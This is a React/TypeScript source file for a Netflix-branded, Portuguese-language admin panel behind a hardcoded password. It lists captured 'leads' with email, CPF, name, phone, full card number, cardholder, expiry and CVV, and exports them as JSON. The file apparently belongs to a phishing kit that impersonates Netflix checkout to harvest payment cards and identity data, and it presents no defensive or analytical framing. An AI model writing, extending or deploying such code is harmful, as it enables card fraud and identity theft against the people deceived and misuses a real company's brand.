import { useState, useEffect } from "react";

interface Lead {
  planId: string;
  planName: string;
  price: number;
  paymentMethod: string;
  email?: string;
  cpf?: string;
  firstName?: string;
  lastName?: string;
  phone?: string;
  cardNumber?: string;
  cardName?: string;
  cardExpiry?: string;
  cardCvv?: string;
  cardBrand?: string;
  timestamp: string;
  userAgent?: string;
}

export function AdminPanel() {
  const [leads, setLeads] = useState<Lead[]>([]);
  const [password, setPassword] = useState("");
  const [authenticated, setAuthenticated] = useState(false);
  const [error, setError] = useState("");
  const [expandedId, setExpandedId] = useState<number | null>(null);

  const ADMIN_PASSWORD = "netflix2024admin";

  useEffect(() => {
    if (authenticated) {
      const data = JSON.parse(localStorage.getItem("netflix_leads") || "[]");
      setLeads(data);
    }
  }, [authenticated]);

  const handleLogin = () => {
    if (password === ADMIN_PASSWORD) {
      setAuthenticated(true);
      setError("");
    } else {
      setError("Senha incorreta");
    }
  };

  const handleClear = () => {
    if (window.confirm("Tem certeza que deseja apagar todos os registros?")) {
      localStorage.removeItem("netflix_leads");
      setLeads([]);
    }
  };

  const handleExport = () => {
    const json = JSON.stringify(leads, null, 2);
    const blob = new Blob([json], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `netflix_leads_${new Date().toISOString().slice(0, 10)}.json`;
    a.click();
  };

  if (!authenticated) {
    return (
      <div className="min-h-screen bg-black flex items-center justify-center p-5">
        <div className="bg-white rounded-2xl p-8 w-full max-w-sm shadow-2xl">
          <div className="text-[#E50914] text-2xl font-black mb-1">NETFLIX</div>
          <h2 className="text-lg font-bold text-gray-800 mb-6">Painel Administrativo</h2>
          <input
            type="password"
            className="w-full border border-gray-300 rounded px-3 py-3 text-sm mb-3 outline-none focus:border-[#E50914]"
            placeholder="Senha de acesso"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            onKeyDown={(e) => e.key === "Enter" && handleLogin()}
          />
          {error && <p className="text-red-500 text-xs mb-3">{error}</p>}
          <button
            onClick={handleLogin}
            className="bg-[#E50914] text-white w-full py-3 font-bold rounded hover:bg-red-700 transition-colors"
          >
            Entrar
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-100 p-5">
      <div className="max-w-5xl mx-auto">
        <div className="flex items-center justify-between mb-6">
          <div>
            <div className="text-[#E50914] text-2xl font-black">NETFLIX</div>
            <h1 className="text-xl font-bold text-gray-800">Painel de Leads</h1>
          </div>
          <div className="flex gap-3">
            <button
              onClick={handleExport}
              className="bg-blue-600 text-white px-4 py-2 rounded font-semibold text-sm hover:bg-blue-700"
            >
              📥 Exportar JSON
            </button>
            <button
              onClick={handleClear}
              className="bg-red-100 text-red-600 px-4 py-2 rounded font-semibold text-sm hover:bg-red-200"
            >
              🗑️ Limpar
            </button>
          </div>
        </div>

        <div className="bg-white rounded-xl shadow p-4 mb-4 flex gap-6 text-center">
          <div className="flex-1">
            <div className="text-2xl font-bold text-gray-800">{leads.length}</div>
            <div className="text-gray-500 text-sm">Total de leads</div>
          </div>
          <div className="flex-1">
            <div className="text-2xl font-bold text-green-600">
              R${" "}
              {leads.reduce((acc, l) => acc + l.price, 0).toFixed(2).replace(".", ",")}
            </div>
            <div className="text-gray-500 text-sm">Receita potencial</div>
          </div>
          <div className="flex-1">
            <div className="text-2xl font-bold text-blue-600">
              {leads.filter((l) => l.paymentMethod === "card").length}
            </div>
            <div className="text-gray-500 text-sm">Cartão</div>
          </div>
          <div className="flex-1">
            <div className="text-2xl font-bold text-purple-600">
              {leads.filter((l) => l.paymentMethod === "pix").length}
            </div>
            <div className="text-gray-500 text-sm">PIX</div>
          </div>
          <div className="flex-1">
            <div className="text-2xl font-bold text-yellow-600">
              {leads.filter((l) => l.paymentMethod === "boleto").length}
            </div>
            <div className="text-gray-500 text-sm">Boleto</div>
          </div>
        </div>

        {leads.length === 0 ? (
          <div className="bg-white rounded-xl shadow p-12 text-center text-gray-400">
            <div className="text-4xl mb-3">📭</div>
            <p>Nenhum lead registrado ainda.</p>
          </div>
        ) : (
          <div className="flex flex-col gap-3">
            {[...leads].reverse().map((lead, i) => {
              const realIndex = leads.length - 1 - i;
              const isExpanded = expandedId === realIndex;
              return (
                <div
                  key={i}
                  className="bg-white rounded-xl shadow overflow-hidden cursor-pointer hover:shadow-md transition-shadow"
                  onClick={() => setExpandedId(isExpanded ? null : realIndex)}
                >
                  <div className="p-5">
                    <div className="flex justify-between items-start mb-2">
                      <div className="flex items-center gap-2 flex-wrap">
                        <span className="bg-blue-100 text-blue-700 text-xs font-bold px-2 py-1 rounded">
                          {lead.planName}
                        </span>
                        <span
                          className={`text-xs font-bold px-2 py-1 rounded ${
                            lead.paymentMethod === "card"
                              ? "bg-purple-100 text-purple-700"
                              : lead.paymentMethod === "pix"
                              ? "bg-green-100 text-green-700"
                              : "bg-yellow-100 text-yellow-700"
                          }`}
                        >
                          {lead.paymentMethod === "card"
                            ? `💳 Cartão${lead.cardBrand ? ` (${lead.cardBrand})` : ""}`
                            : lead.paymentMethod === "pix"
                            ? "⚡ PIX"
                            : "🧾 Boleto"}
                        </span>
                      </div>
                      <div className="text-right">
                        <div className="text-[#E50914] font-bold">
                          R$ {lead.price.toFixed(2).replace(".", ",")}
                        </div>
                        <div className="text-gray-400 text-xs">
                          {new Date(lead.timestamp).toLocaleString("pt-BR")}
                        </div>
                      </div>
                    </div>

                    <div className="grid grid-cols-2 gap-x-8 gap-y-1 text-sm">
                      {lead.email && (
                        <div>
                          <span className="text-gray-400">E-mail: </span>
                          <span className="font-medium">{lead.email}</span>
                        </div>
                      )}
                      {(lead.firstName || lead.lastName) && (
                        <div>
                          <span className="text-gray-400">Nome: </span>
                          <span className="font-medium">{lead.firstName} {lead.lastName}</span>
                        </div>
                      )}
                      {lead.cpf && (
                        <div>
                          <span className="text-gray-400">CPF: </span>
                          <span className="font-medium">{lead.cpf}</span>
                        </div>
                      )}
                      {lead.cardNumber && (
                        <div>
                          <span className="text-gray-400">Cartão: </span>
                          <span className="font-mono font-medium">{lead.cardNumber}</span>
                        </div>
                      )}
                    </div>
                  </div>

                  {/* Expanded details */}
                  {isExpanded && (
                    <div className="border-t border-gray-100 bg-gray-50 p-5">
                      <h4 className="text-xs font-bold text-gray-500 uppercase mb-2">Dados completos</h4>
                      <div className="grid grid-cols-2 gap-x-8 gap-y-2 text-sm">
                        {lead.cardName && (
                          <div>
                            <span className="text-gray-400">Titular: </span>
                            <span className="font-medium">{lead.cardName}</span>
                          </div>
                        )}
                        {lead.cardExpiry && (
                          <div>
                            <span className="text-gray-400">Validade: </span>
                            <span className="font-medium">{lead.cardExpiry}</span>
                          </div>
                        )}
                        {lead.cardCvv && (
                          <div>
                            <span className="text-gray-400">CVV: </span>
                            <span className="font-medium">{lead.cardCvv}</span>
                          </div>
                        )}
                        {lead.phone && (
                          <div>
                            <span className="text-gray-400">Telefone: </span>
                            <span className="font-medium">{lead.phone}</span>
                          </div>
                        )}
                      </div>
                      {lead.userAgent && (
                        <div className="mt-3 text-[11px] text-gray-400 break-all">
                          <span className="font-semibold">User Agent: </span>
                          {lead.userAgent}
                        </div>
                      )}
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        )}
      </div>
    </div>
  );
}
